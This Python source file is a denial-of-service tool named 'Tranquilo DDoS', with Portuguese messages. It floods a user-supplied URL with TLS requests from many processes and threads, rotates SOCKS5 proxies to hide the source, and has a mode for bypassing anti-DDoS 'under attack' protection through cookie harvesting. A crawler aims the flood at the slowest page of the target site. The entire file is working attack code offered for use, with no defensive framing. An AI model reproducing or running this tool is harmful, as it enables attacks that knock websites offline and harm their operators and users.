import multiprocessing
import threading, socks, ssl, random, argparse, threading
import time
from urllib.parse import urlparse

import TranquiloCheck
import TranquiloCookie
import TranquiloCrawler
import TranquiloHeaders
import TranquiloProxy



def tranquiloLaunch(url, threads, dheaders, dusarProxy, dProxies):
    for i in range(int(threads)):
        threading.Thread(target=tranquiloAttack, args=(url, dheaders, dusarProxy, dProxies)).start()


def tranquiloAttack(url, dheaders, dusarProxy, dProxies):
    while True:
        
        req = random.choice(dheaders)
    
        try:
            s = socks.socksocket()
            s.connect((str(urlparse(url).netloc), int(443)))
            
            if dusarProxy:
                proxy = random.choice(dProxies).strip().split(":")
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(req)
            try:
                for _ in range(100):
                    s.send(req)
            except:
                s.close()
        except:
            s.close()


def pularLinhas(x=1):
    for _ in range(x):
        print('')

if __name__ == '__main__':
    
    rodar = True
    cookie = None
    userAgent = None
    usarProxy = False
    
    
    parser = argparse.ArgumentParser(description='Tranquilo DDoS')
    
    parser.add_argument('--url', '-u', type=str, required=True, help='URL do Alvo')
    parser.add_argument('--thread', '-t', type=int, required=True, help='Numero de threads que a utilizar')
    
    parser.add_argument('--numHeaders', '-e', type=int, required=False, default='2500', help='Numero de Headers a Serem Gerados')
    parser.add_argument('--underAttack', '-a', required=False, action='store_true', default=False, help='Ativa o modo de bypass UAM')
    parser.add_argument('--useProxy', '-p', required=False, action='store_true', default=False, help='Define se irão ser utilizados Proxies')
    parser.add_argument('--proxyList', '-l', type=str, required=False, help='Aceita uma Lista de Proxy em um .txt')
    parser.add_argument('--useCrawler', '-c', required=False, action='store_true', default=False, help='Define se irá ativar o Crawler')
    
    args = parser.parse_args()

    target = args.url
    thread = args.thread
    
    numHeaders = args.numHeaders
    underAttack = args.underAttack
    usarProxy = args.useProxy
    proxylist = args.proxyList
    usarCrawler = args.useCrawler

    
    pularLinhas()
    
    if underAttack and usarProxy:
        print(" Modo UnderAttack Não Suportado Com o Uso de Proxys")
        print(" Fechando Programa...")
        usarProxy = False
        quit()
        
    pularLinhas()
    
    TranquiloCheck.verificar_resources()
    
    pularLinhas(2)
    
    if usarProxy:
        print(" Uso de Proxy - Ativado")
        if proxylist is not None:
            custom = True
        else:
            custom = False
            
        proxies = TranquiloProxy.definir_proxies(custom_list=custom, userList=proxylist)
    else:
        proxies = []
        print(" Uso de Proxy - Desativado")
    
    pularLinhas(2)
    
    if underAttack:
        print(" UnderAttack Mode - Ativado")
        print(" Inicando Coleta de Cookies...")
        time.sleep(1)
        cookie, userAgent = TranquiloCookie.get_cookie(url=target, user=(TranquiloHeaders.random_user_agent()))
    else:
        print(" UnderAttack Mode - Desativado")
    
    pularLinhas(2)
    
    try:
        if usarCrawler:
            print(" Crawler Mode - Ativado")
            print(' Iniciando Crawling...')
            maiores_urls = TranquiloCrawler.iniciar_crawl(url=target, underAttack=underAttack, cookie=cookie, userAgent=userAgent)
            pularLinhas()
            print(' Crawling Finalizado')
            print(f'  Url Mais Pesada: {maiores_urls[0]['url']}')
            print(f'  Tempo de Resposta: {round(maiores_urls[0]['response_time'], 2)} segundos')
            target = maiores_urls[0]['url']
        else:
            print(" Crawler Mode - Desativado")
    except:
        print(" Erro No Crawler Continuando com url Fornecida")
        pass
    
    pularLinhas(2)
    
    print(' Gerando Headers...')
    headers = TranquiloHeaders.carrega_Headers(url=target, num_headers=numHeaders, underAttack=underAttack, cookie=cookie, agent=userAgent)
    print(' Headers Gerados com Sucesso')
    
    pularLinhas(2)
    
    
    
    
    print(' Iniciando Ataque')
    quantidade_processos = multiprocessing.cpu_count()  # Ou defina um número específico

    processos = []

    for i in range(quantidade_processos):
        p = multiprocessing.Process(target=tranquiloLaunch, args=(target, thread, headers, usarProxy, proxies))
        p.start()
        processos.append(p)

    try:
        # Mantenha o programa rodando até interrupção
        for p in processos:
            p.join()
    except KeyboardInterrupt:
        # Permite parar os processos com Ctrl+C
        for p in processos:
            p.join()
    
    
    
   
    # print(' Iniciando Ataque')
    # threading.Thread(target=tranquiloLaunch, args=(target, thread)).start()
    # print(' Feche o Terminal Para Encerrar')
    
    pularLinhas(2)